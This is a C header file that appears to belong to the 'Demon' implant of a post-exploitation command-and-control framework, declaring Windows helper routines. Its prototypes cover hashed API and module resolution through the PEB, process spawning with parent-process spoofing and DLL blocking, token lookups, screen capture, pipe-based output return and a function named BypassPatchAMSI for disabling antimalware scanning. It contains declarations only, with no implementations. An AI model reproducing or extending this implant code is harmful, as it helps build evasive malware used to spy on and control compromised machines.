#ifndef DEMON_WINUTILS_H
#define DEMON_WINUTILS_H

#include <windows.h>
#include <tlhelp32.h>
#include <winsock2.h>
#include <mscoree.h>
#include <shellapi.h>
#include <winhttp.h>

#include <Common/Macros.h>
#include <Common/Native.h>

#include <Core/Syscalls.h>

#include <iphlpapi.h>
#include <lm.h>

typedef struct _BUFFER
{
    PVOID Buffer;
    ULONG Length;
} BUFFER, *PBUFFER;

typedef struct _ANONPIPE
{
    HANDLE StdOutRead;
    HANDLE StdOutWrite;
} ANONPIPE, *PANONPIPE;

#define HASH_KEY 5381
#define WIN_FUNC(x) __typeof__(x) * x;

#define DEREF( name )       *( UINT_PTR* ) ( name )
#define DEREF_32( name )    *( DWORD* )    ( name )
#define DEREF_16( name )    *( WORD* )     ( name )

#define PIPE_BUFFER_MAX 0x10000 - 1
#define MAX( a, b ) ( ( a ) > ( b ) ? ( a ) : ( b ) )
#define MIN( a, b ) ( ( a ) < ( b ) ? ( a ) : ( b ) )

DWORD    HashStringA( PCHAR String );

PVOID    LdrFunctionAddr( HMODULE DllModuleBase, DWORD FunctionHash );
PVOID    LdrModulePeb( DWORD hash );
PVOID    LdrModuleLoad( LPSTR ModuleName );

/*!
 * Starts a Process
 *
 * @param EnableWow64 start 32-bit/wow64 process
 * @param App App path
 * @param CmdLine Process to run
 * @param Flags Process Flags
 * @param ProcessInfo Process Information struct
 * @param Piped Send output back
 * @param AnonPipes Uses Anon pipe struct as default pipe. only works if Piped is to False
 * @brief Spawns a process with current set settings (ppid spoof, blockdll, token)
 * @return
 */
BOOL     ProcessCreate( BOOL EnableWow64, LPSTR App, LPSTR CmdLine, DWORD Flags, PROCESS_INFORMATION* ProcessInfo, BOOL Piped, PANONPIPE AnonPipes );
BOOL     ProcessIsWow( HANDLE hProcess );
HANDLE   ProcessOpen( DWORD ProcessID, DWORD Access );
NTSTATUS ProcessSnapShot( PSYSTEM_PROCESS_INFORMATION* Buffer, PSIZE_T Size );

PCHAR    TokenGetUserDomain( HANDLE hToken, PDWORD UserSize );
BOOL     WinScreenshot( PVOID* ImagePointer, PSIZE_T ImageSize );

BOOL     AnonPipesInit( PANONPIPE AnonPipes );
VOID     AnonPipesRead( PANONPIPE AnonPipes );
VOID     AnonPipesClose( PANONPIPE AnonPipes );

BOOL     PipeWrite( HANDLE Handle, PBUFFER Buffer );
BOOL     PipeRead(  HANDLE Handle, PBUFFER Buffer );

BOOL     BypassPatchAMSI( );
ULONG    RandomNumber32( VOID );
UINT_PTR HashEx( LPVOID String, UINT_PTR Length, BOOL Upper );

#endif
